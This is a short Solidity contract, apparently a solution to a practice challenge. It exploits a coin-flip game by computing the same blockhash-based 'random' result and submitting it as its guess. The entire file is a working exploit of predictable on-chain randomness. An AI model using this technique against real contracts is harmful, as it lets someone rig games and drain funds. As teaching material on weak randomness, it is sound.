// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// CoinFlip 컨트랙트의 인터페이스 정의
interface ICoinFlip {
    function flip(bool guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttack {
    ICoinFlip target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    // 이벤트로 결과 기록
    event AttackResult(bool guess, bool result, uint256 consecutiveWins);
    
    constructor() {
        target = ICoinFlip(0x1bAf050d551937d2640BcbED91ddD152f18a18aa);
    }
    
    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        
        // flip 함수 호출하고 결과 받기
        bool result = target.flip(guess);
        
        // 현재 연속 승수 확인
        uint256 wins = target.consecutiveWins();
        
        // 이벤트로 결과 출력
        emit AttackResult(guess, result, wins);
        
        return result;
    }
    
    // 현재 연속 승수만 확인하는 함수
    function getWins() public view returns (uint256) {
        return target.consecutiveWins();
    }
    
}